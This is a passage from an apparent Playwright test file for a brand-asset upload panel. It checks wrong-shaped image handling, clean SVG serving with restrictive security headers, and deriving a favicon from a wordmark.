   * The distinction is the whole design: a script in an SVG has no correct
   * version and is refused; a square link-preview card is a fine file in the
   * wrong shape, and blocking somebody over the only artwork they have at four
   * in the afternoon is a design system being precious rather than safe.
   */
  test("stores artwork of the wrong shape and says what will happen to it", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/brand`);

    const panel = brandPanel(page);
    await panel.getByLabel("Asset").selectOption("social");
    await panel.getByLabel("Alternative text").fill("Northwind Health link card");
    await panel.getByLabel("File").setInputFiles({
      name: "card.png",
      mimeType: "image/png",
      buffer: squarePng,
    });
    await panel.getByRole("button", { name: "Upload" }).click();

    await expect(panel.getByText(/saved\./)).toBeVisible();
    await expect(panel.getByText(/cropped/)).toBeVisible();

    await slot(page, "Link preview").getByRole("button", { name: "Remove" }).click();
    await expect(slot(page, "Link preview").getByText("Nothing uploaded")).toBeVisible();
  });

  test("accepts plain artwork and shows it on the ground it is for", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/brand`);

    const panel = brandPanel(page);
    await panel.getByLabel("Asset").selectOption("mark-dark");
    await panel.getByLabel("Alternative text").fill("Northwind Health reversed wordmark");
    await panel.getByLabel("File").setInputFiles({
      name: "wordmark.svg",
      mimeType: "image/svg+xml",
      buffer: CLEAN,
    });
    await panel.getByRole("button", { name: "Upload" }).click();

    const mark = slot(page, "Mark, on dark").getByRole("img", {
      name: "Northwind Health reversed wordmark",
    });
    await expect(mark).toBeVisible();

    // Content-addressed: the URL is the digest, which is what makes it safe to
    // serve immutably and what lets a published version pin its artwork.
    await expect(mark).toHaveAttribute("src", /\/f\/[^/]+\/[0-9a-f]{64}\.svg$/);

    // Served with the headers that make an SVG inert even if the check is
    // one day wrong. Fetched through the page's own session.
    const src = await mark.getAttribute("src");
    const served = await page.request.get(`${BASE}${src}`);
    expect(served.status()).toBe(200);
    expect(served.headers()["content-security-policy"]).toContain("default-src 'none'");
    expect(served.headers()["x-content-type-options"]).toBe("nosniff");

    // Put it back, so the refusal test above still sees three empty grounds
    // whichever order the workers run in.
    await slot(page, "Mark, on dark").getByRole("button", { name: "Remove" }).click();
    await expect(slot(page, "Mark, on dark").getByText("Nothing uploaded")).toBeVisible();
  });

  /**
   * Cutting a favicon out of the wordmark, which is the one derivation offered.
   *
   * The value is not the crop maths — it is that the result is shown at 16
   * pixels before anybody commits to it. A wordmark at 16 pixels is a smudge,
   * and this exists so the person deciding can see that rather than be told.
   *
   * The derived PNG travels as a data URL and is decoded on the server, so it
   * arrives through the same check as a hand-uploaded file. A picture this
   * app generated is not a picture this app trusts.
   */
  test("cuts a favicon from the wordmark, at the size that decides", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/brand`);

    const panel = brandPanel(page);
    await panel.getByLabel("Asset").selectOption("mark-light");
    await panel.getByLabel("Alternative text").fill("Northwind Health crop source");
    await panel.getByLabel("File").setInputFiles({
      name: "wordmark.svg",
      mimeType: "image/svg+xml",
      buffer: WORDMARK,
    });
    await panel.getByRole("button", { name: "Upload" }).click();
    await expect(slot(page, "Mark, on light").getByRole("img")).toBeVisible();

    const derive = page.locator("section", {
      has: page.getByRole("heading", { name: "Cut a favicon from the mark" }),
    });

    // Every size a browser asks for, on both grounds — a tab strip is light in
    // one browser and dark in another, and a mark that vanishes on one of them
    // is what this is here to make visible.
    for (const size of [16, 32, 64]) {
      await expect(
        // Exact, because the dark row's label starts with the same words and a
        // loose match resolves to both.
        derive.getByRole("img", { name: `The crop at ${size} pixels`, exact: true }),
      ).toBeVisible();
      await expect(
        derive.getByRole("img", { name: `The crop at ${size} pixels, on a dark tab strip` }),
      ).toBeVisible();
    }

    // Three crops, because which one is right depends on the mark.
    // Exact: every canvas is labelled "The crop at N pixels", which a loose
    // match on "Crop" also finds.
    const cropField = derive.getByLabel("Crop", { exact: true });
    await expect(cropField.getByRole("option")).toHaveCount(3);
    await cropField.selectOption("leading");

    await derive.getByRole("button", { name: "Use this crop" }).click();
    await expect(derive.getByText(/Favicon saved/)).toBeVisible();

    // It landed in the favicon slot as a real, content-addressed PNG — the
    // derivation goes through the upload path, it does not go around it.
    const favicon = slot(page, "Favicon").getByRole("img");
    await expect(favicon).toHaveAttribute("src", /\/f\/[^/]+\/[0-9a-f]{64}\.png$/);

    await slot(page, "Favicon").getByRole("button", { name: "Remove" }).click();
    await slot(page, "Mark, on light").getByRole("button", { name: "Remove" }).click();
  });
});
